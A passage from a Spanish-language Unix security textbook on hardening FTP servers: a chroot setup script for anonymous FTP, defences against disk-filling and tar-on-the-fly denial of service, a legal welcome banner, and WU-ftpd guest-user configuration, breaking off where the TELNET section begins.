&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1/pub
&#x00A0;fi
&#x00A0;chmod&#x00A0;2555&#x00A0;$1/pub
&#x00A0;chown&#x00A0;root&#x00A0;$1/pub
&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1/incoming&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1/incoming
&#x00A0;fi
&#x00A0;chmod&#x00A0;1733&#x00A0;$1/incoming
&#x00A0;chown&#x00A0;root&#x00A0;$1/incoming
&#x00A0;#&#x00A0;Si&#x00A0;estamos&#x00A0;en&#x00A0;Solaris,&#x00A0;aun&#x00A0;no&#x00A0;hemos&#x00A0;acabado
&#x00A0;if&#x00A0;[&#x00A0;$OS&#x00A0;=&#x00A0;&#x0022;SunOS&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Mas&#x00A0;librerias
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;$OS:&#x00A0;Instalando&#x00A0;librerias...&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;ld.so.1&#x00A0;libc.so.1&#x00A0;libdl.so.1&#x00A0;libmp.so.2&#x00A0;libnsl.so.1&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;libsocket.so.1&#x00A0;nss&#x005F;compat.so.1&#x00A0;nss&#x005F;dns.so.1&#x00A0;nss&#x005F;files.so.1&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nss&#x005F;nis.so.1&#x00A0;nss&#x005F;nisplus.so.1&#x00A0;nss&#x005F;xfn.so.1&#x00A0;straddr.so&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;straddr.so.2;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cp&#x00A0;/usr/lib/$i&#x00A0;$1/usr/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;done
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1/dev&#x00A0;];&#x00A0;then

&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1/dev
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/dev
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Generamos&#x00A0;dispositivos
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;$OS:&#x00A0;Generando&#x00A0;dispositivos...&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;/dev/zero&#x00A0;/dev/tcp&#x00A0;/dev/udp&#x00A0;/dev/ticotsord;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;MAJOR=&#x2018;ls&#x00A0;-lL&#x00A0;$i|awk&#x00A0;&#x2019;{print&#x00A0;$5}&#x2019;|sed&#x00A0;s/&#x0022;,&#x0022;//g&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;MINOR=&#x2018;ls&#x00A0;-lL&#x00A0;$i|awk&#x00A0;&#x2019;{print&#x00A0;$6}&#x2019;&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;TYPE=&#x2018;ls&#x00A0;-lL&#x00A0;$i|cut&#x00A0;-c1-1&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/mknod&#x00A0;$1/$i&#x00A0;$TYPE&#x00A0;$MAJOR&#x00A0;$MINOR
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;done
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chmod&#x00A0;666&#x00A0;$1/dev/*
&#x00A0;fi
&#x00A0;echo&#x00A0;&#x0022;FIN&#x0022;
&#x00A0;#&#x00A0;FIN&#x00A0;de&#x00A0;Solaris
&#x00A0;anita:~#
</literallayout>
<!--l. 792--><para>Algunos problemas relacionados con incoming/ provienen de los permisos con que se crean sus &#xFB01;cheros y
subdirectorios: aunque los usuarios an&#x00F3;nimos no puedan leer el directorio, con algunos servidores ftpd
s&#x02CA;&#x0131; que es posible que puedan leer los &#xFB01;cheros contenidos en &#x00E9;l (y sus subdirectorios), con lo que sigue siendo
posible acceder a los archivos conociendo su nombre exacto; para evitar este problema, muchos
administradores plani&#xFB01;can un sencillo shellscript para que cada cierto tiempo mueva los contenidos de
incoming a otro lugar, fuera del alcance de los usuarios an&#x00F3;nimos (por ejemplo, un subdirectorio con
modo 000 de /tmp/). Ciertos servidores, como WU&#x2013;ftpd, tienen un &#xFB01;chero de con&#xFB01;guraci&#x00F3;n
(/etc/ftpaccess) donde indicar &#x2013; entre otras cosas &#x2013; los modos con que se van a crear entradas en
incoming/.
<!--br/-->
<!--br/-->Un ataque t&#x02CA;&#x0131;pico a los servidores de FTP es una negaci&#x00F3;n de servicio llenando todo el espacio disponible
para el upload de &#xFB01;cheros; para minimizar las consecuencias de este ataque, es conveniente situar el
directorio ~ftp/ en una partici&#x00F3;n separada del resto del sistema de &#xFB01;cheros, donde s&#x00F3;lo se encuentre dicho
directorio; algunos demonios permiten directamente limitar la cantidad de &#xFB01;cheros subidos al servidor en
cada sesi&#x00F3;n.
<!--br/-->
<!--br/-->Otra negaci&#x00F3;n de servicio muy habitual contra los servidores de FTP an&#x00F3;nimo es obligar a las m&#x00E1;quinas a
consumir una excesiva cantidad de CPU, ralentizando el sistema hasta que la calidad de servicio es muy
baja; esto se produce en servidores que permiten descargar directorios completos como un &#x00FA;nico archivo,
empaquetados con tar y/o comprimidos con gzip. Veamos un ejemplo extra&#x02CA;&#x0131;do de una sesi&#x00F3;n de FTP
an&#x00F3;nimo:

     </para><literallayout role="verbatim">
&#x00A0;ftp&#x003E;&#x00A0;pwd
&#x00A0;257&#x00A0;&#x0022;/pub/utils&#x0022;&#x00A0;is&#x00A0;current&#x00A0;directory.
&#x00A0;ftp&#x003E;&#x00A0;ls
&#x00A0;200&#x00A0;PORT&#x00A0;command&#x00A0;successful.
&#x00A0;150&#x00A0;Opening&#x00A0;ASCII&#x00A0;mode&#x00A0;data&#x00A0;connection&#x00A0;for&#x00A0;/bin/ls.
&#x00A0;total&#x00A0;377
&#x00A0;drwxr-xr-x&#x00A0;&#x00A0;&#x00A0;2&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1024&#x00A0;Sep&#x00A0;18&#x00A0;22:28&#x00A0;.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;&#x00A0;3&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;wheel&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1024&#x00A0;Sep&#x00A0;18&#x00A0;22:28&#x00A0;..
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;163519&#x00A0;Sep&#x00A0;18&#x00A0;22:28&#x00A0;transfig-3.1.2.tar.gz
&#x00A0;-rw-r--r--&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;217850&#x00A0;Sep&#x00A0;18&#x00A0;22:27&#x00A0;tth&#x005F;C.tgz
&#x00A0;226&#x00A0;Transfer&#x00A0;complete.
&#x00A0;ftp&#x003E;&#x00A0;&#x00A0;cd&#x00A0;..
&#x00A0;250&#x00A0;CWD&#x00A0;command&#x00A0;successful.
&#x00A0;ftp&#x003E;&#x00A0;pwd
&#x00A0;257&#x00A0;&#x0022;/pub&#x0022;&#x00A0;is&#x00A0;current&#x00A0;directory.
&#x00A0;ftp&#x003E;&#x00A0;ls
&#x00A0;200&#x00A0;PORT&#x00A0;command&#x00A0;successful.
&#x00A0;150&#x00A0;Opening&#x00A0;ASCII&#x00A0;mode&#x00A0;data&#x00A0;connection&#x00A0;for&#x00A0;/bin/ls.
&#x00A0;total&#x00A0;3
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;&#x00A0;3&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;wheel&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1024&#x00A0;Sep&#x00A0;18&#x00A0;22:28&#x00A0;.
&#x00A0;drwxrwxr-x&#x00A0;&#x00A0;&#x00A0;8&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;wheel&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1024&#x00A0;Aug&#x00A0;&#x00A0;1&#x00A0;&#x00A0;1994&#x00A0;..
&#x00A0;drwxr-xr-x&#x00A0;&#x00A0;&#x00A0;2&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1024&#x00A0;Sep&#x00A0;18&#x00A0;22:28&#x00A0;utils
&#x00A0;226&#x00A0;Transfer&#x00A0;complete.
&#x00A0;ftp&#x003E;&#x00A0;get&#x00A0;utils.tar.gz
&#x00A0;local:&#x00A0;utils.tar.gz&#x00A0;remote:&#x00A0;utils.tar.gz
&#x00A0;200&#x00A0;PORT&#x00A0;command&#x00A0;successful.
&#x00A0;150&#x00A0;Opening&#x00A0;BINARY&#x00A0;mode&#x00A0;data&#x00A0;connection&#x00A0;for&#x00A0;/bin/tar.
&#x00A0;226&#x00A0;Transfer&#x00A0;complete.
&#x00A0;381369&#x00A0;bytes&#x00A0;received&#x00A0;in&#x00A0;1.07&#x00A0;secs&#x00A0;(3.5e+02&#x00A0;Kbytes/sec)
&#x00A0;ftp&#x003E;
</literallayout>
<!--l. 852--><para>Como podemos ver, acabamos de descargar un directorio completo empaquetado y comprimido
sin m&#x00E1;s que a~nadir al nombre de dicho directorio la extensi&#x00F3;n .tar.gz (o simplemente .tar
si no hubi&#x00E9;ramos querido comprimirlo). Evidentemente esto resulta muy &#x00FA;til en determinadas
situaciones pero, &#x00BF;nos hemos parado a pensar que suceder&#x02CA;&#x0131;a si alguien intentara descargar el
directorio /pub.tar.gz en un servidor con unos cuantos Gigabytes de &#xFB01;cheros? La carga del
sistema crecer&#x02CA;&#x0131;a much&#x02CA;&#x0131;simo, ya que estamos empaquetando y comprimiendo un archivo de
grandes dimensiones; si ahora extendemos esto a varios usuarios que ejecutan la misma orden
simult&#x00E1;neamente podemos hacernos una idea de la sobrecarga introducida en la m&#x00E1;quina: una raz&#x00F3;n
m&#x00E1;s que su&#xFB01;ciente para tener cuidado con los directorios que permitimos descargar de esta
forma&#x2026;
<!--br/-->
<!--br/-->Por &#x00FA;ltimo, es una buena idea mostrar un mensaje cuando los usuarios an&#x00F3;nimos conectan a nuestra m&#x00E1;quina
donde se indiquen claramente los &#xFB01;nes del sistema y la atenci&#x00F3;n a su uso indebido; este mensaje puede
sernos &#x00FA;til tanto con &#xFB01;nes jur&#x02CA;&#x0131;dicos (as&#x02CA;&#x0131; el atacante no podr&#x00E1; argumentar que desconoc&#x02CA;&#x0131;a la &#xFB01;nalidad del
sistema) como con &#xFB01;nes disuasorios: si el pirata se da cuenta de que nos preocupamos por la seguridad de
nuestro servidor, es posible que lo abandone y busque otro menos protegido. Por ejemplo, si utilizamos
WU&#x2013;ftpd, en ~ftp/welcome.msg podemos escribir el mensaje mostrado al conectar al sistema,
y en diferentes &#xFB01;cheros .message el mensaje que se vuelca a acceder a un directorio (estos
nombres son con&#xFB01;gurables en /etc/ftpaccess). Un ejemplo del mensaje de entrada puede ser el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/export/home/ftp/welcome.msg
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ANITA&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;*&#x00A0;*
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;-----------&#x00A0;&#x00A0;Bienvenid@s&#x00A0;a&#x00A0;ANITA&#x00A0;&#x00A0;------------
&#x00A0;&#x00A0;&#x00A0;Esta&#x00A0;maquina&#x00A0;es&#x00A0;propiedad&#x00A0;de&#x00A0;la&#x00A0;Universidad&#x00A0;Politecnica&#x00A0;de&#x00A0;Valencia&#x00A0;y
&#x00A0;&#x00A0;&#x00A0;sus&#x00A0;fines&#x00A0;son&#x00A0;exclusivamente&#x00A0;academicos&#x00A0;y&#x00A0;de&#x00A0;investigacion.&#x00A0;Cualquier
&#x00A0;&#x00A0;&#x00A0;otro&#x00A0;uso&#x00A0;sera&#x00A0;perseguido&#x00A0;y&#x00A0;castigado&#x00A0;con&#x00A0;el&#x00A0;maximo&#x00A0;rigor.
&#x00A0;&#x00A0;&#x00A0;Cualquier&#x00A0;actividad&#x00A0;realizada&#x00A0;en,&#x00A0;desde&#x00A0;o&#x00A0;hacia&#x00A0;este&#x00A0;sistema&#x00A0;esta
&#x00A0;&#x00A0;&#x00A0;sujeta&#x00A0;a&#x00A0;monitorizacion&#x00A0;sin&#x00A0;previo&#x00A0;aviso.
&#x00A0;
&#x00A0;anita:~#
</literallayout>
<!--l. 891--><para>
  </para></section><!--end subsection--><!--l. 891--><section 
role="subsection"><title><abbrev role="title-mark">14.3.2</abbrev><anchor 
   id="x1-22000014.3.2"  ></anchor>FTP invitado</title>
<!--l. 892--><para>  Hasta ahora hemos visto dos formas de transferir &#xFB01;cheros desde una m&#x00E1;quina Unix mediante FTP:
o bien el usuario conecta utilizando su login y su clave al sistema y descarga de &#x00E9;l cualquier
archivo sobre el que tenga permiso de lectura, de cualquier parte del sistema de &#xFB01;cheros, o
bien accede a un entorno restringido mediante chroot() como usuario an&#x00F3;nimo, con un login
gen&#x00E9;rico y usando como contrase~na una direcci&#x00F3;n de correo &#x2013; seguramente falsa &#x2013;. En muchas
ocasiones, estos modelos pueden resultar insu&#xFB01;cientes o al menos poco adecuados a nuestras
necesidades.
<!--br/-->
<!--br/-->Imaginemos esta situaci&#x00F3;n: un proveedor de acceso a Internet decide ofrecer a sus clientes la posibilidad de
actualizar sus p&#x00E1;ginas web personales mediante FTP, de forma que cada uno de ellos no tiene m&#x00E1;s que
conectar con su nombre de usuario y su contrase~na al servidor y subir sus &#xFB01;cheros HTML; dichos login y
password ser&#x00E1;n por supuesto diferentes para cada usuario, por lo que parece claro que un entorno de FTP
an&#x00F3;nimo no es aplicable &#x2013; al menos de forma inmediata &#x2013; en esta situaci&#x00F3;n. El FTP &#x2018;normal&#x2019; funcionar&#x02CA;&#x0131;a
correctamente, pero su utilizaci&#x00F3;n tampoco es &#x00F3;ptima: si un usuario no necesita acceder m&#x00E1;s que
a su $HOME para actualizar sus p&#x00E1;ginas, &#x00BF;por qu&#x00E9; permitirle que vea todo nuestro sistema
de &#xFB01;cheros, aunque sea v&#x02CA;&#x0131;a FTP, y que pueda descargar archivos tan comprometedores como
/etc/passwd?
<!--br/-->
<!--br/-->Los potenciales problemas de seguridad que la situaci&#x00F3;n anterior implica han dado lugar a un tercer tipo de
acceso FTP denominado invitado (guest), que se puede contemplar como una mezcla de los dos
vistos hasta el momento. La idea de este mecanismo es muy sencilla: se trata de permitir que
cada usuario conecte a la m&#x00E1;quina mediante su login y su contrase~na, pero evitando que tenga
acceso a partes del sistema de &#xFB01;cheros que no necesita para realizar su trabajo; conectar&#x00E1; a
un entorno restringido mediante chroot(), algo muy similar a lo que sucede en los accesos
an&#x00F3;nimos.
<!--br/-->
<!--br/-->Para poder crear f&#x00E1;cilmente entornos FTP restringidos a cada usuario es conveniente instalar
WU-ftpd en la m&#x00E1;quina; este servidor est&#x00E1; disponible libremente a trav&#x00E9;s de Internet, en la direcci&#x00F3;n
ftp://ftp.wu-ftpd.org/pub/wu-ftpd/. Otros servidores, como el distribuido con Solaris, permiten crear
usuarios FTP invitados pero de una forma m&#x00E1;s compleja; en los ejemplos que veamos en este punto vamos a
asumir que utilizamos WU-ftpd.
<!--br/-->
<!--br/-->Lo primero que necesitamos para con&#xFB01;gurar el entorno al que van a conectar este tipo de usuarios es una
estructura de directorios y archivos muy similar a la que hemos estudiado para los accesos a trav&#x00E9;s de FTP
an&#x00F3;nimo, pero esta vez colgando del directorio de conexi&#x00F3;n del usuario invitado; con unas peque~nas
variaciones, podemos utilizar para crear este entorno el shellscript que hemos presentado en el punto
anterior. As&#x02CA;&#x0131;, si queremos que nuestro usuario toni acceda como invitado v&#x02CA;&#x0131;a FTP podemos crear esta
estructura en su $HOME:


     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;/usr/local/sbin/creaentorno&#x00A0;/export/home/toni
&#x00A0;Creando&#x00A0;estructura&#x00A0;de&#x00A0;directorios&#x00A0;para&#x00A0;SunOS
&#x00A0;Instalando&#x00A0;programas&#x00A0;y&#x00A0;librerias...
&#x00A0;Generando&#x00A0;/etc/passwd...
&#x00A0;Generando&#x00A0;/etc/group...
&#x00A0;Generando&#x00A0;pub/&#x00A0;e&#x00A0;incoming...
&#x00A0;SunOS:&#x00A0;Instalando&#x00A0;librerias...
&#x00A0;SunOS:&#x00A0;Generando&#x00A0;dispositivos...
&#x00A0;FIN
&#x00A0;anita:~#
</literallayout>
<!--l. 950--><para>Realmente, son necesarias peque~nas modi&#xFB01;caciones sobre el esquema anterior para que todo funcione
correctamente; por un lado, los directorios pub/ e incoming/ no son necesarios en los accesos como
invitado, ya que a priori los usuarios que accedan de esta forma necesitar&#x00E1;n escribir en varios directorios del
entorno. Adem&#x00E1;s, quiz&#x00E1;s nos interese repasar los permisos de toda la jerarqu&#x02CA;&#x0131;a de directorios creada, para
a&#xFB01;nar m&#x00E1;s los lugares en los que se les permita escribir a los usuarios; por ejemplo, si s&#x00F3;lo van a subir
archivos a un directorio $HOME/public<informalequation><graphic 
fileref="unixsec294x.gif"></graphic></informalequation>html/, donde se ubicar&#x00E1;n sus p&#x00E1;ginas web, no tienen por qu&#x00E9; escribir
en el resto del entorno. De la misma forma, si el directorio $HOME es propiedad de cada usuario quiz&#x00E1;s
pueda borrar archivos como lib, que es un enlace a usr/lib/, lo que puede llegar a comprometer nuestra
seguridad.
<!--br/-->
<!--br/-->Otro punto a tener en cuenta es qui&#x00E9;n va a poseer &#xFB01;cheros dentro del entorno restringido, ya que esos
usuarios y sus grupos deber&#x00E1;n tener una entrada en los archivos etc/passwd y etc/group; como suced&#x02CA;&#x0131;a
con los usuarios an&#x00F3;nimos, estos &#xFB01;cheros no se van a usar aqu&#x02CA;&#x0131; para realizar autenticaci&#x00F3;n, sino simplemente
para ver los nombres del usuario y grupo propietarios de cada &#xFB01;chero al realizar un listado, por lo
que en ninguno de ellos es necesaria una contrase~na real: basta con un asterisco en el campo
correspondiente.
<!--br/-->
<!--br/-->Una vez que hemos creado correctamente el entorno es necesario con&#xFB01;gurar el acceso del usuario en
cuesti&#x00F3;n. Generalmente no nos interesar&#x00E1; que acceda por telnet o similar, por lo que su shell en
/etc/passwd (el original de la m&#x00E1;quina, no el del entorno restringido) ha de ser algo como
/bin/false. Es necesario que exista una entrada para este shell en /etc/shells, ya que de lo
contrario el usuario no podr&#x00E1; autenticarse; si este &#x00FA;ltimo archivo no existe, es necesario crearlo. Su
directorio $HOME, indicado en /etc/passwd, tambi&#x00E9;n ha de ser modi&#xFB01;cado de la siguiente
forma:

     </para><literallayout role="verbatim">
&#x00A0;toni:x:1002:10:Toni&#x00A0;at&#x00A0;ANITA:/export/home/toni/./:/bin/sh
</literallayout>
<!--l. 985--><para>Como vemos, se a~nade &#x2018;/./&#x2019; al directorio $HOME del usuario. Esta cadena indica d&#x00F3;nde se va a efectuar el
chroot() (por ejemplo, si quisi&#x00E9;ramos que el chroot() se hiciera sobre /export/home/ y tras esta llamada
el usuario entrara a su directorio toni, lo indicar&#x02CA;&#x0131;amos como
<!--br/-->/export/home/./toni/).
<!--br/-->
<!--br/-->Tras modi&#xFB01;car /etc/passwd hemos de modi&#xFB01;car /etc/group para incluir al usuario &#x2018;toni&#x2019; en un grupo
que luego de&#xFB01;niremos como invitado, por ejemplo &#x2018;rftp&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;grep&#x00A0;toni&#x00A0;/etc/group
&#x00A0;rftp::400:toni
&#x00A0;anita:~#
</literallayout>
<!--l. 1001--><para>Ahora falta por con&#xFB01;gurar el archivo /etc/ftpaccess; hemos de indicarle al demonio que utilice este
&#xFB01;chero (por ejemplo, mediante la opci&#x00F3;n &#x2018;-a&#x2019;). En &#x00E9;l de&#xFB01;nimos el grupo &#x2018;guest&#x2019; en las clases
apropiadas:

     </para><literallayout role="verbatim">
&#x00A0;class&#x00A0;&#x00A0;&#x00A0;local&#x00A0;&#x00A0;&#x00A0;real,guest,anonymous&#x00A0;*.domain&#x00A0;0.0.0.0
&#x00A0;class&#x00A0;&#x00A0;&#x00A0;remote&#x00A0;&#x00A0;real,guest,anonymous&#x00A0;*
</literallayout>
<!--l. 1010--><para>Tambi&#x00E9;n le damos a los usuarios &#x2018;guest&#x2019; los permisos que consideremos oportunos; habitualmente, interesar&#x00E1;
que puedan borrar, sobreescribir y renombrar sus archivos. Pero no es normal que necesiten ejecutar
cambios en los modos de los &#xFB01;cheros o en su m&#x00E1;scara de permisos:

     </para><literallayout role="verbatim">
&#x00A0;delete&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;no&#x00A0;&#x00A0;&#x00A0;anonymous&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;delete&#x00A0;permission?
&#x00A0;overwrite&#x00A0;&#x00A0;no&#x00A0;&#x00A0;&#x00A0;anonymous&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;overwrite&#x00A0;permission?
&#x00A0;rename&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;no&#x00A0;&#x00A0;&#x00A0;anonymous&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;rename&#x00A0;permission?
&#x00A0;chmod&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;no&#x00A0;&#x00A0;&#x00A0;anonymous,guest&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;chmod&#x00A0;permission?
&#x00A0;umask&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;no&#x00A0;&#x00A0;&#x00A0;anonymous,guest&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;umask&#x00A0;permission?
</literallayout>
<!--l. 1023--><para>Y por &#x00FA;ltimo, tambi&#x00E9;n en /etc/ftpaccess, de&#xFB01;nimos al grupo &#x2018;rftp&#x2019; como invitado:

     </para><literallayout role="verbatim">
&#x00A0;guestgroup&#x00A0;rftp
</literallayout>
<!--l. 1030--><para>Una vez llegados a este punto el usuario ya est&#x00E1; en disposici&#x00F3;n de conectar como invitado v&#x02CA;&#x0131;a FTP; aunque
realmente acceder&#x00E1; a su $HOME, para &#x00E9;l ser&#x00E1; el directorio ra&#x02CA;&#x0131;z, y no ver&#x00E1; ning&#x00FA;n archivo del sistema que no se
encuentre en este directorio.
<!--br/-->
<!--br/-->Antes de &#xFB01;nalizar, un &#x00FA;ltimo apunte: el entorno restringido que acabamos de ver s&#x00F3;lo se aplica para accesos
por FTP; as&#x02CA;&#x0131;, si el usuario tiene de&#xFB01;nido un shell est&#x00E1;ndar en /etc/passwd, cuando conecte mediante telnet
o similar seguir&#x00E1; teniendo acceso a todo el sistema de &#xFB01;cheros, por lo que todo el trabajo que hemos
realizado perder&#x02CA;&#x0131;a su sentido. Aunque en el siguiente punto daremos alguna idea para crear entornos
restringidos en los accesos por terminal remota, esta situaci&#x00F3;n es mucho m&#x00E1;s extra~na que la de los accesos
invitados, por lo que normalmente (y esto es muy importante) los shells de los usuarios
invitados han de ser del tipo /bin/false, es decir, no les permitiremos una sesi&#x00F3;n interactiva en
el sistema por terminal remota. Con un shell de este estilo, si intentan acceder a la m&#x00E1;quina
(por ejemplo mediante telnet), nada m&#x00E1;s introducir correctamente su login y su password ser&#x00E1;n
desconectados:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;SunOS&#x00A0;5.7
&#x00A0;
&#x00A0;login:&#x00A0;toni
&#x00A0;Password:
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~#
</literallayout>
<!--l. 1063--><para>
  </para></section><!--end subsection--></section><!--end section--><!--l. 1063--><section 
role="section"><title><abbrev role="title-mark">14.4</abbrev><anchor 
   id="x1-22100014.4"  ></anchor>El servicio TELNET</title>
<!--l. 1064--><para>  El protocolo TELNET (TCP, puerto 23) permite utilizar una m&#x00E1;quina como terminal virtual de otra a trav&#x00E9;s
